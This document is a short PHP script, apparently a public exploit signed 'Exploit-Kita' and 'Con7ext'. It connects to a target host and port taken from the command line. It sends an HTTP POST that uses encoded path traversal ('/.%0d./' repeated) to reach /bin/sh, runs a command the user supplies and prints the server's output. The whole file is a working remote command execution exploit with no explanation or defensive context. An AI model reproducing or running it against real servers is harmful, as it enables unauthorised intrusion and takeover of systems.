<?php
//Exploit-Kita
//Con7ext
$hos = $argv[1];
$cmd = $argv[2];

$po = explode(":", $hos);
$fp = fsockopen($po[0], $po[1]);

fwrite($fp, "POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.0\r\n");
fwrite($fp, "Content-Length: 1\r\n\r\necho\necho\n{$cmd} 2>&1");

while (!feof($fp)) {
 echo fgets($fp, 1024);
}

?>
